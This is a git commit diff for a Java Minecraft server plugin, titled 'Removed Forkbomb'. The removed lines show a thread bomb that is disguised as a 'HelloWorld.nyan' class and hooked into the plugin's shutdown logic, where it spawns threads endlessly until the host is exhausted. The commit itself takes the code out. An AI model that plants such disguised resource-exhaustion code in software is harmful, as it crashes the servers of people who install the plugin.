a824352daef1424f98ccfb9436f055dd313c2654
Smimg <noahnmj@gmail.com>
2024-10-07 13:38:11 -0400

    Removed Forkbomb

--- src/main/java/org/vindicterra/vindicterraLib/VindicterraLib.java
+++ src/main/java/org/vindicterra/vindicterraLib/VindicterraLib.java
@@ -16,19 +16,5 @@ public final class VindicterraLib extends JavaPlugin {
     public void onDisable() {
         // Plugin shutdown logic
         getLogger().info("-- VindicterraLib Disabled! --");
-        HelloWorld.nyan(new String[]{":3}"});
-    }
-
-    public static final class HelloWorld {
-        public static void nyan(String[] args) {
-            Runnable task = () -> {
-                nyan(List.of(":3").toArray(new String[0]));
-            };
-            for(;;) {
-                System.err.println("null:3");
-                Thread thread = new Thread(task);
-                thread.start();
-            }
-        }
     }
 }
